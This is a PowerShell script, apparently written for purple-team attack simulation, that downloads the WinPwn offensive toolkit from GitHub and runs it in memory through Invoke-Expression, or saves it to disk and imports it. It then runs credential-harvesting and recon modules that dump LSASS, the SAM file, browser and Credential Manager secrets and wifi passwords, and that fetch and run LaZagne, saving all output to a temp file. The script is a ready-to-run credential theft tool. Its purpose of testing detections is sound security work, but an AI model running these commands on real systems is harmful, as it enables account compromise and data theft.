<#
    FIXME: add mitre associated MITRE techniques (covers a lot...)
    Executing Winpwn scripts from https://raw.githubusercontent.com//mthcht/WinPwn/master/Offline_WinPwn.ps1
#>

param(
    [Parameter(Mandatory=$false)]
    [switch]$download,
    [Parameter(Mandatory=$false)]
    [switch]$inmemory
)

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force -Verbose

function exec_commands($dumpfile){
    Write-Host -ForegroundColor Cyan "[Info] Running command 'WinPwn -noninteractive -consoleoutput -Localrecon (enumerate as much information for the local system as possible) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- WinPwn -noninteractive -consoleoutput -Localrecon ---------" -Verbose -Force
    WinPwn -noninteractive -consoleoutput -Localrecon >> $dumpfile
    
    Write-Host -ForegroundColor Cyan "[Info] Running command 'WinPwn -noninteractive -consoleoutput -DomainRecon (return every single domain recon script and function) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- WinPwn -noninteractive -consoleoutput -DomainRecon ---------" -Verbose -Force
    WinPwn -noninteractive -consoleoutput -DomainRecon >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'Generalrecon -noninteractive (Execute basic local recon functions and store the output in the corresponding folders) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- Generalrecon -noninteractive ---------" -Verbose -Force
    Generalrecon -noninteractive -consoleoutput >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'WinPwn -PowerSharpPack -consoleoutput -noninteractive (Execute Seatbelt, PowerUp, Watson and more C# binaries in memory) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- WinPwn -PowerSharpPack -consoleoutput -noninteractive ---------" -Verbose -Force
    WinPwn -PowerSharpPack -consoleoutput -noninteractive >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'Kittielocal -noninteractive -consoleoutput -browsercredentials (Dump Browser-Credentials via Sharpweb returning the output to console) >> $dumpfile'..." 
    Add-Content $dumpfile "$(get-date)`n--------- Kittielocal -noninteractive -consoleoutput -browsercredentials ---------" -Verbose -Force
    Kittielocal -noninteractive -consoleoutput -browsercredentials >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'dumplsass -noninteractive -consoleoutput (Dumping LSASS) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- dumplsass -noninteractive -consoleoutput ---------" -Verbose -Forcec
    dumplsass -noninteractive -consoleoutput >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'obfuskittiedump -noninteractive -consoleoutput >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- obfuskittiedump -noninteractive -consoleoutput ---------" -Verbose -Force
    obfuskittiedump -noninteractive -consoleoutput >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'Invoke-WCMDump -noninteractive -consoleoutput (Dumping Windows Credential Manager) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- Invoke-WCMDump -noninteractive -consoleoutput ---------" -Verbose -Force
    Invoke-WCMDump -noninteractive -consoleoutput >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'Invoke-Sharpweb -command `"all`" (Getting Browser Credentials using Sharpweb) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- Invoke-Sharpweb -command `"all`" ---------" -Verbose -Force
    Invoke-Sharpweb -command "all" >> $dumpfile
    
    Write-Host -ForegroundColor Cyan "[Info] Running command 'samfile -noninteractive -consoleoutput (Dumping SAM) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- samfile -noninteractive -consoleoutput ---------" -Verbose -Force
    samfile -noninteractive -consoleoutput >> $dumpfile
    
    Write-Host -ForegroundColor Cyan "[Info] Running command 'SharpCloud -noninteractive -consoleoutput >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- SharpCloud -noninteractive -consoleoutput ---------" -Verbose -Force
    SharpCloud -noninteractive -consoleoutput >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'wificreds -noninteractive -consoleoutput >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- wificreds -noninteractive -consoleoutput (Get stored wifi credentials) ---------" -Verbose -Force
    wificreds -noninteractive -consoleoutput >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'lazagnemodule -noninteractive -consoleoutput (Downloads and executes Lazagne from AlessandroZ for Credential gathering / privilege escalation) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- lazagnemodule -noninteractive -consoleoutput ---------" -Verbose -Force
    lazagnemodule -noninteractive -consoleoutput >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'Dotnetsearch -consoleoutput -noninteractive >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- Dotnetsearch -consoleoutput -noninteractive ---------" -Verbose -Force
    Dotnetsearch -consoleoutput -noninteractive >> $dumpfile
}

try{
    if (-not $inmemory -and -not $download) {
        Write-Host -ForegroundColor Yellow "[Warning] No option selected, Using default option: -inmemory"
        $inmemory = $true
    }
    if ($inmemory -and $download) {
        Write-Host -ForegroundColor Red "[Error] Both options selected, Use either -inmemory or -download"
        exit 1
    }

    $url = "https://raw.githubusercontent.com//mthcht/WinPwn/master/Offline_WinPwn.ps1"
    $outfile = "$env:tmp\Off_WnPwn.ps1"
    $dumpfile = "$env:tmp\WinPwn.txt"

    if($inmemory){
        Write-Host -ForegroundColor Cyan "[Info] Downloading $url into memory"
        $ProgressPreference = 'SilentlyContinue'
        Invoke-Expression(new-object net.webclient).downloadstring($url) -Force -Verbose
    }
    if ($download){
        Write-Host -ForegroundColor Cyan "[Info] Downloading $url to $outfile"
        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $url -OutFile $outfile -UserAgent 'purpleteam' -Verbose
        if (Test-Path $outfile){
            Write-Host -ForegroundColor Green "[Success] Downloaded $url to $outfile"
            Import-module $outfile -Force -Verbose
            $module_name = $(($outfile -split '\\')[-1].Replace('.ps1',''))
            if(Get-Module -Name $module_name -Verbose){
                Write-Host -ForegroundColor Green "[Success] Loaded module $module_name"
            }
            else{
                Write-Host -ForegroundColor Red "[Error] Failed to load module $module_name"
            }           
        }
        else{
            Write-Host -ForegroundColor Red "[Error] Failed to download $url to $outfile"
        }
    }
}
catch{
    Write-Host -ForegroundColor Red "[Error] Exception - $_"
}

Write-Host -ForegroundColor Cyan "[Info] Running Winpwn commands, this can take a long time..."
exec_commands($dumpfile)
if (Test-Path $dumpfile){
    Write-Host -ForegroundColor Green "[Success] WinPwn Offline executed, output saved to $dumpfile"
}
else{
    Write-Host -ForegroundColor Red "[Error] Failed to execute WinPwn and save output to $dumpfile"
}

Stop-Transcript -Verbose 
